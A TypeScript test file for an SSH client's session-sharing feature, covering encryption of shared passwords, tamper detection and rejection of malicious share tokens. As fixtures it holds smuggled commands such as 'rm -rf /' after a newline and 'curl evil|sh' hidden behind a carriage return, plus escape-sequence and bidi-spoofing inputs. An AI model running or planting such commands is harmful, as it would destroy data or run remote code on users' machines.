import { describe, it, expect } from 'vitest'
import {
  buildShareText, buildFolderShareText, parseShareText, findShareToken, materializeFolder, unlockShare,
  SHARE_PREFIX, MAX_TOKEN_LENGTH, MAX_SHARED_SESSIONS, MAX_FOLDER_DEPTH, type ParseResult
} from './sessionShare'
import { ShareUnlockError } from './shareCrypto'

const PASS = '공유 암호 1234'

const session = {
  id: 'abc', name: '[운영] MBRIS WAS', host: '10.0.0.5', port: 22, username: 'mbris',
  authType: 'password' as const, password: 'pw-1', passphrase: '', folderId: 'f1', icon: 'server',
  privateKeyPath: 'C:\\Users\\me\\.ssh\\id_rsa', backgroundColor: '#3b82f6',
  connectTimeout: 20, keepaliveInterval: 30, autoReconnect: true, postConnectScript: 'cd /data\nls',
  mcpEnabled: true, suRoot: true, suPassword: 'root-pw',
  dbConnections: [{ id: 'd', password: 'db-pw' }], dbAliases: { k: 'v' },
  useJumpHost: true, jumpHost: 'bastion.example.com', jumpPort: 2222, jumpUsername: 'jump',
  jumpAuthType: 'password' as const, jumpPassword: 'jump-pw', jumpPrivateKeyPath: 'D:\\k', jumpPassphrase: ''
}

/** A token for a hand-made (possibly hostile) payload */
function rawTokenOf(value: unknown): string {
  const bytes = new TextEncoder().encode(JSON.stringify(value))
  let binary = ''
  bytes.forEach(b => { binary += String.fromCharCode(b) })
  return SHARE_PREFIX + btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
}

/** A session token made from any object */
const tokenOf = (value: unknown) => rawTokenOf({ session: value })

const minimal = { name: 'a', host: 'h.example.com', port: 22, username: 'u', authType: 'password' }

function asSession(result: ParseResult) {
  if (!result.ok || result.kind !== 'session') throw new Error(result.ok ? 'not a session' : result.error)
  return result
}

function asFolder(result: ParseResult) {
  if (!result.ok || result.kind !== 'folder') throw new Error(result.ok ? 'not a folder' : result.error)
  return result
}

describe('buildShareText', () => {
  it('writes a readable first line and a token line, without secrets by default', async () => {
    const text = await buildShareText(session)
    const [summary, token] = text.split('\n')
    expect(summary).toBe('[ezShell 세션] [운영] MBRIS WAS · mbris@10.0.0.5:22 (비밀번호 없음)')
    expect(token.startsWith(SHARE_PREFIX)).toBe(true)
    expect(token).not.toContain('.')
    const parsed = asSession(parseShareText(text))
    expect(parsed.session.password).toBeUndefined()
    expect(parsed.session.suPassword).toBeUndefined()
    expect(parsed.hasSecrets).toBe(false)
  })

  it('never carries id, folder, key paths, MCP access, DB accounts or plain passwords', async () => {
    const text = await buildShareText(session, { passphrase: PASS })
    for (const secret of ['pw-1', 'root-pw', 'jump-pw', 'db-pw', 'id_rsa']) expect(text).not.toContain(secret)
    const parsed = asSession(parseShareText(text))
    const keys = Object.keys(parsed.session)
    for (const key of ['id', 'folderId', 'icon', 'privateKeyPath', 'jumpPrivateKeyPath', 'mcpEnabled', 'dbConnections', 'dbAliases', 'password']) {
      expect(keys).not.toContain(key)
    }
  })

  it('encrypts the passwords with the shared passphrase and unlocks them', async () => {
    const text = await buildShareText(session, { passphrase: PASS })
    expect(text.split('\n')[0]).toContain('(비밀번호 암호화됨 · 공유 암호 필요)')
    const parsed = asSession(parseShareText(text))
    expect(parsed.hasSecrets).toBe(true)
    const unlocked = asSession(await unlockShare(parsed, PASS))
    expect(unlocked.session).toEqual({
      name: '[운영] MBRIS WAS', host: '10.0.0.5', port: 22, username: 'mbris', authType: 'password',
      password: 'pw-1', backgroundColor: '#3b82f6', connectTimeout: 20, keepaliveInterval: 30,
      autoReconnect: true, postConnectScript: 'cd /data\nls', suRoot: true, suPassword: 'root-pw',
      useJumpHost: true, jumpHost: 'bastion.example.com', jumpPort: 2222, jumpUsername: 'jump',
      jumpAuthType: 'password', jumpPassword: 'jump-pw'
    })
    expect(unlocked.locked).toBeUndefined()
  })

  it('refuses a wrong passphrase', async () => {
    const parsed = parseShareText(await buildShareText(session, { passphrase: PASS }))
    await expect(unlockShare(parsed, 'wrong passphrase')).rejects.toBeInstanceOf(ShareUnlockError)
  })

  it('refuses to unlock after the host was swapped in the text', async () => {
    const text = await buildShareText(session, { passphrase: PASS })
    const [, token] = text.split('\n')
    const [, secretPart] = token.slice(SHARE_PREFIX.length).split('.')
    const forged = `${tokenOf({ ...minimal, host: 'evil.example.com' })}.${secretPart}`
    const parsed = asSession(parseShareText(forged))
    expect(parsed.hasSecrets).toBe(true)
    await expect(unlockShare(parsed, PASS)).rejects.toBeInstanceOf(ShareUnlockError)
  })

  it('writes no secret part when the session has no passwords', async () => {
    const text = await buildShareText({ ...minimal, password: '' }, { passphrase: PASS })
    expect(text.split('\n')[0]).toContain('(비밀번호 없음)')
    expect(asSession(parseShareText(text)).hasSecrets).toBe(false)
  })

  it('leaves out jump host fields when the jump host is off', async () => {
    const parsed = asSession(await unlockShare(parseShareText(await buildShareText({ ...session, useJumpHost: false }, { passphrase: PASS })), PASS))
    expect(parsed.session.jumpHost).toBeUndefined()
    expect(parsed.session.jumpPassword).toBeUndefined()
  })

  it('keeps the summary on one line even if the name has a line break', async () => {
    expect((await buildShareText({ ...session, name: 'a\nb' })).split('\n')).toHaveLength(2)
  })
})

describe('findShareToken', () => {
  it('finds the token among other messenger text', () => {
    const token = tokenOf(minimal)
    expect(findShareToken(`오늘 서버 정보 보내요\n${token}\n확인 부탁`)).toBe(token)
  })

  it('returns null when there is none', () => {
    expect(findShareToken('just text')).toBeNull()
  })
})

describe('parseShareText', () => {
  it('rejects text with no token', () => {
    expect(parseShareText('hello').ok).toBe(false)
  })

  it('rejects a broken token', () => {
    expect(parseShareText(`${SHARE_PREFIX}%%%`).ok).toBe(false)
    expect(parseShareText(`${SHARE_PREFIX}bm90IGpzb24`).ok).toBe(false) // "not json"
    expect(parseShareText(`${tokenOf(minimal)}.bm90IGpzb24`).ok).toBe(false) // secret part not json
    expect(parseShareText(`${tokenOf(minimal)}.${rawTokenOf({ salt: 'x' }).slice(SHARE_PREFIX.length)}`).ok).toBe(false)
  })

  it('tells a newer format apart', () => {
    const result = parseShareText('ezshell-session:v2:abc')
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.error).toContain('새 버전')
  })

  it('rejects an oversized token', () => {
    expect(parseShareText(SHARE_PREFIX + 'A'.repeat(MAX_TOKEN_LENGTH + 1)).ok).toBe(false)
  })

  it('drops fields it does not know, including MCP access, key paths and plain passwords', () => {
    const result = asSession(parseShareText(tokenOf({ ...minimal, mcpEnabled: true, privateKeyPath: 'C:\\x', id: 'x', folderId: 'f', password: 'plain', extra: 1 })))
    expect(result.session).toEqual(minimal)
    expect(result.hasSecrets).toBe(false)
  })

  it('rejects control characters and spaces where they could do harm', () => {
    expect(parseShareText(tokenOf({ ...minimal, host: 'h\nrm -rf /' })).ok).toBe(false)
    expect(parseShareText(tokenOf({ ...minimal, host: 'a b' })).ok).toBe(false)
    expect(parseShareText(tokenOf({ ...minimal, username: 'u\r' })).ok).toBe(false)
    expect(parseShareText(tokenOf({ ...minimal, name: 'x\u001b[2J' })).ok).toBe(false)
    expect(parseShareText(tokenOf({ ...minimal, postConnectScript: 'ls\u001b]0;x\u0007' })).ok).toBe(false)
  })

  it('allows line breaks and tabs in the start-up script', () => {
    expect(parseShareText(tokenOf({ ...minimal, postConnectScript: 'cd /data\r\n\tls' })).ok).toBe(true)
  })

  it('checks ranges, types and required fields', () => {
    expect(parseShareText(tokenOf({ ...minimal, port: 0 })).ok).toBe(false)
    expect(parseShareText(tokenOf({ ...minimal, port: 70000 })).ok).toBe(false)
    expect(parseShareText(tokenOf({ ...minimal, port: '22' })).ok).toBe(false)
    expect(parseShareText(tokenOf({ ...minimal, authType: 'agent' })).ok).toBe(false)
    expect(parseShareText(tokenOf({ ...minimal, host: '' })).ok).toBe(false)
    expect(parseShareText(tokenOf({ ...minimal, host: 'h'.repeat(254) })).ok).toBe(false)
    expect(parseShareText(tokenOf({ name: 'a', port: 22, username: 'u', authType: 'password' })).ok).toBe(false)
    expect(parseShareText(tokenOf([minimal])).ok).toBe(false)
    expect(parseShareText(rawTokenOf(minimal)).ok).toBe(false)
  })

  it('trims names and addresses and falls back to the address for an empty name', () => {
    const trimmed = asSession(parseShareText(tokenOf({ ...minimal, name: '  운영  ', host: ' h.example.com ' })))
    expect(trimmed.session.name).toBe('운영')
    expect(trimmed.session.host).toBe('h.example.com')
    expect(asSession(parseShareText(tokenOf({ ...minimal, name: '' }))).session.name).toBe('u@h.example.com')
  })

  it('drops cosmetic or tuning values that are out of range instead of refusing', () => {
    const result = asSession(parseShareText(tokenOf({ ...minimal, backgroundColor: 'url(javascript:x)', connectTimeout: -5, keepaliveInterval: 'x' })))
    expect(result.session.backgroundColor).toBeUndefined()
    expect(result.session.connectTimeout).toBeUndefined()
    expect(result.session.keepaliveInterval).toBeUndefined()
  })
})

describe('folders', { timeout: 30000 }, () => {
  const folders = [
    { id: 'root', name: '운영', backgroundColor: '#ef4444' },
    { id: 'was', name: 'WAS', parentId: 'root' },
    { id: 'deep', name: '깊은', parentId: 'was' },
    { id: 'other', name: '다른 폴더' }
  ]
  const sessions = [
    { ...session, id: 's1', name: 'web', folderId: 'root', password: 'web-pw' },
    { ...session, id: 's2', name: 'was-1', folderId: 'was', password: '', suRoot: false, useJumpHost: false },
    { ...session, id: 's3', name: 'deep-1', folderId: 'deep', password: 'deep-pw' },
    { ...session, id: 's4', name: 'elsewhere', folderId: 'other' }
  ]

  it('copies the folder with every sub-folder and session under it, nothing else', async () => {
    const text = (await buildFolderShareText('root', folders, sessions))!
    expect(text.split('\n')[0]).toBe('[ezShell 폴더] 운영 · 하위 폴더 2개, 세션 3개 (비밀번호 없음)')
    const parsed = asFolder(parseShareText(text))
    expect(parsed.folderCount).toBe(2)
    expect(parsed.sessionCount).toBe(3)
    expect(parsed.hasSecrets).toBe(false)
    expect(parsed.folder.name).toBe('운영')
    expect(parsed.folder.backgroundColor).toBe('#ef4444')
    expect(parsed.folder.sessions.map(s => s.name)).toEqual(['web'])
    expect(parsed.folder.folders[0].name).toBe('WAS')
    expect(parsed.folder.folders[0].folders[0].sessions[0].name).toBe('deep-1')
    const json = JSON.stringify(parsed.folder)
    expect(json).not.toContain('elsewhere')
    expect(json).not.toContain('mcpEnabled')
  })

  it('encrypts every session password once and puts each back on its own session', async () => {
    const text = (await buildFolderShareText('root', folders, sessions, { passphrase: PASS }))!
    for (const secret of ['web-pw', 'deep-pw', 'root-pw']) expect(text).not.toContain(secret)
    const parsed = asFolder(parseShareText(text))
    expect(parsed.hasSecrets).toBe(true)
    const unlocked = asFolder(await unlockShare(parsed, PASS))
    expect(unlocked.folder.sessions[0].password).toBe('web-pw')
    expect(unlocked.folder.folders[0].sessions[0].password).toBeUndefined()
    expect(unlocked.folder.folders[0].folders[0].sessions[0].password).toBe('deep-pw')
    expect(unlocked.folder.folders[0].folders[0].sessions[0].suPassword).toBe('root-pw')
  })

  it('returns null for an unknown folder and survives a parent loop', async () => {
    expect(await buildFolderShareText('nope', folders, sessions)).toBeNull()
    const loop = [{ id: 'a', name: 'A', parentId: 'b' }, { id: 'b', name: 'B', parentId: 'a' }]
    expect(asFolder(parseShareText((await buildFolderShareText('a', loop, []))!)).folderCount).toBe(1)
  })

  it('rejects a bad session inside a folder, naming the field', () => {
    const result = parseShareText(rawTokenOf({ folder: { name: 'f', sessions: [{ ...minimal, host: 'a\nb' }] } }))
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.error).toContain('호스트')
  })

  it('rejects folders nested too deep or too many sessions', () => {
    let deep: Record<string, unknown> = { name: 'leaf' }
    for (let i = 0; i < MAX_FOLDER_DEPTH + 2; i++) deep = { name: `f${i}`, folders: [deep] }
    expect(parseShareText(rawTokenOf({ folder: deep })).ok).toBe(false)
    const many = Array.from({ length: MAX_SHARED_SESSIONS + 1 }, (_, i) => ({ ...minimal, name: `s${i}` }))
    const split = { name: 'f', folders: [{ name: 'a', sessions: many.slice(0, 600) }, { name: 'b', sessions: many.slice(600) }] }
    expect(parseShareText(rawTokenOf({ folder: split })).ok).toBe(false)
  })

  it('needs a folder name', () => {
    expect(parseShareText(rawTokenOf({ folder: { name: '  ', sessions: [] } })).ok).toBe(false)
  })

  it('materializes new folders and sessions under the chosen parent with fresh ids and MCP off', async () => {
    const parsed = asFolder(parseShareText((await buildFolderShareText('root', folders, sessions))!))
    let n = 0
    const { rootId, folders: made, sessions: madeSessions } = materializeFolder(parsed.folder, 'target', () => `id${++n}`)
    expect(rootId).toBe('id1')
    expect(made.map(f => [f.id, f.name, f.parentId])).toEqual([
      ['id1', '운영', 'target'], ['id3', 'WAS', 'id1'], ['id5', '깊은', 'id3']
    ])
    expect(madeSessions.map(s => [s.name, s.folderId])).toEqual([['web', 'id1'], ['was-1', 'id3'], ['deep-1', 'id5']])
    expect(madeSessions.every(s => s.mcpEnabled === false)).toBe(true)
    expect(new Set([...made.map(f => f.id), ...madeSessions.map(s => s.id)]).size).toBe(6)
  })
})

describe('security review fixes', { timeout: 30000 }, () => {
  it('refuses a lone carriage return in the start-up script and turns CRLF into LF', () => {
    expect(parseShareText(tokenOf({ ...minimal, postConnectScript: 'echo ok\rcurl evil|sh' })).ok).toBe(false)
    const crlf = asSession(parseShareText(tokenOf({ ...minimal, postConnectScript: 'cd /data\r\n\tls' })))
    expect(crlf.session.postConnectScript).toBe('cd /data\n\tls')
  })

  it('refuses invisible and reordering characters in names and addresses', () => {
    expect(parseShareText(tokenOf({ ...minimal, name: 'safe‮hs.lave' })).ok).toBe(false)
    expect(parseShareText(tokenOf({ ...minimal, host: 'h​.example.com' })).ok).toBe(false)
    expect(parseShareText(tokenOf({ ...minimal, username: 'u\u0085' })).ok).toBe(false)
    expect(parseShareText(tokenOf({ ...minimal, name: 'a b' })).ok).toBe(false)
    expect(parseShareText(tokenOf({ ...minimal, postConnectScript: 'ls ‮#' })).ok).toBe(false)
  })

  it('drops "use a jump host" when there is no jump host address', () => {
    const result = asSession(parseShareText(tokenOf({ ...minimal, useJumpHost: true, jumpPort: 22, jumpUsername: 'j' })))
    expect(result.session).toEqual(minimal)
  })

  it('refuses to build a folder text the receiver could not import', async () => {
    const chain = Array.from({ length: MAX_FOLDER_DEPTH + 1 }, (_, i) => ({ id: `f${i}`, name: `f${i}`, parentId: i ? `f${i - 1}` : undefined }))
    await expect(buildFolderShareText('f0', chain, [])).rejects.toThrow(/단계/)
    const many = Array.from({ length: MAX_SHARED_SESSIONS + 1 }, (_, i) => ({ ...minimal, id: `s${i}`, folderId: 'r' }))
    await expect(buildFolderShareText('r', [{ id: 'r', name: 'r' }], many)).rejects.toThrow(/세션/)
  })

  it('refuses a token with too many objects before validating them', () => {
    const folders = Array.from({ length: 30 }, () => ({ name: 'x', folders: Array.from({ length: 199 }, () => ({ name: 'y' })) }))
    expect(parseShareText(rawTokenOf({ folder: { name: 'f', folders } })).ok).toBe(false)
  })
})
